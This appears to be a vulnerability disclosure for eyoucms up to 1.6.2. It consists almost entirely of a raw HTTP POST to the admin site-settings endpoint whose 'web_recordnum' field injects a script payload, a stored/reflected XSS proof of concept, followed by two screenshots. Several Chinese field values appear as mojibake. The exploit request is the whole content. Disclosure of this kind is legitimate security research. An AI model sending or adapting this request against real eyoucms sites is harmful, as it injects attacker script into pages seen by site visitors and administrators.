eyoucms up to 1.6.2 'web_recordnum' reflected xss vulnerability POC:

```
POST /eyou/login.php?m=admin&c=System&a=web&lang=cn HTTP/1.1
Host: *.*.*.*
Content-Length: 2516
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://*.*.*.*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhhsKshhhBxjK42gW
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://*.*.*.*/eyou/login.php?m=admin&c=System&a=web&lang=cn
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=dtuu9jp26p9dm5o2si9mcvfi2b; admin_lang=cn; home_lang=cn; ENV_UPHTML_AFTER=%7B%22seo_uphtml_after_home%22%3A0%2C%22seo_uphtml_after_channel%22%3A%221%22%2C%22seo_uphtml_after_pernext%22%3A%221%22%7D; admin-arctreeClicked-Arr=%5B%5D; ENV_GOBACK_URL=%2Feyou%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26lang%3Dcn; ENV_LIST_URL=%2Feyou%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26lang%3Dcn; admin-treeClicked-Arr=%5B%5D; workspaceParam=web%7CSystem
Connection: close

------WebKitFormBoundaryhhsKshhhBxjK42gW
Content-Disposition: form-data; name="web_status"

0
------WebKitFormBoundaryhhsKshhhBxjK42gW
Content-Disposition: form-data; name="web_status_mode"

0
------WebKitFormBoundaryhhsKshhhBxjK42gW
Content-Disposition: form-data; name="web_status_text"

ç½ç«ææ¶å³é­ï¼ç»´æ¤ä¸­â¦â¦
------WebKitFormBoundaryhhsKshhhBxjK42gW
Content-Disposition: form-data; name="web_status_url"


------WebKitFormBoundaryhhsKshhhBxjK42gW
Content-Disposition: form-data; name="web_status_tpl"


------WebKitFormBoundaryhhsKshhhBxjK42gW
Content-Disposition: form-data; name="web_name"

Demoç«ç¹
------WebKitFormBoundaryhhsKshhhBxjK42gW
Content-Disposition: form-data; name="web_logo_local"


------WebKitFormBoundaryhhsKshhhBxjK42gW
Content-Disposition: form-data; name="web_logo_remote"

https://update.eyoucms.com/demo/uploads/allimg/20210114/1-2101140933194M.png
------WebKitFormBoundaryhhsKshhhBxjK42gW
Content-Disposition: form-data; name="web_logo_is_remote"

1
------WebKitFormBoundaryhhsKshhhBxjK42gW
Content-Disposition: form-data; name="web_ico"


------WebKitFormBoundaryhhsKshhhBxjK42gW
Content-Disposition: form-data; name="web_basehost"

http://*.*.*.*/eyou
------WebKitFormBoundaryhhsKshhhBxjK42gW
Content-Disposition: form-data; name="web_title"

ææç½ç»ç§ææéå¬å¸
------WebKitFormBoundaryhhsKshhhBxjK42gW
Content-Disposition: form-data; name="web_keywords"


------WebKitFormBoundaryhhsKshhhBxjK42gW
Content-Disposition: form-data; name="web_description"


------WebKitFormBoundaryhhsKshhhBxjK42gW
Content-Disposition: form-data; name="web_copyright"

Copyright Â© 2012-2022 ææå¬å¸ çæææ
------WebKitFormBoundaryhhsKshhhBxjK42gW
Content-Disposition: form-data; name="web_recordnum"

<a href="https://beian.miit.gov.cn/" rel="nofollow" target="_blank">ç¼ICPå¤xxxxxxxxå·</a><script>alert('2')</script>
------WebKitFormBoundaryhhsKshhhBxjK42gW
Content-Disposition: form-data; name="web_recordnum_mode"

1
------WebKitFormBoundaryhhsKshhhBxjK42gW
Content-Disposition: form-data; name="web_garecordnum"

beianhao
------WebKitFormBoundaryhhsKshhhBxjK42gW
Content-Disposition: form-data; name="web_garecordnum_mode"

1
------WebKitFormBoundaryhhsKshhhBxjK42gW
Content-Disposition: form-data; name="web_thirdcode_pc"


------WebKitFormBoundaryhhsKshhhBxjK42gW
Content-Disposition: form-data; name="web_thirdcode_wap"


------WebKitFormBoundaryhhsKshhhBxjK42gW--


```

![image](https://user-images.githubusercontent.com/55875284/232015361-41f1a2e6-56d1-4092-ba11-009e1fc0b4ec.png)

![image](https://user-images.githubusercontent.com/55875284/232015435-6655b02f-71e2-4fce-b390-ecb0a9dddc9a.png)




